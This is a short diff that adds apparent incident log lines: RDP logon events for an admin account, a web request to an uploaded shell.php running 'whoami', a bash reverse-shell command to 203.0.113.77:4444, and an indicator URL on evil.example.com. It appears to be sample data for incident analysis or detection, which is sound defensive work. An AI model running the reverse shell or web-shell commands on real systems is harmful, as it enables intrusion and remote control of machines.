@@ -1,0 +1,5 @@
+2026-05-19 08:10:01 EventID=4625 Account=admin SourceNetworkAddress=203.0.113.8 LogonType=10
+2026-05-19 08:10:11 EventID=4624 Account=admin SourceNetworkAddress=203.0.113.8 LogonType=10
+192.0.2.10 - - [19/May/2026:14:31:22 +0800] "POST /upload/shell.php?cmd=whoami HTTP/1.1" 200 532 "-" "Mozilla/5.0"
+2026-05-19 09:06:14 www-data 2314 0.0 0.1 /bin/bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1
+IOC observed: http://evil.example.com/a.sh
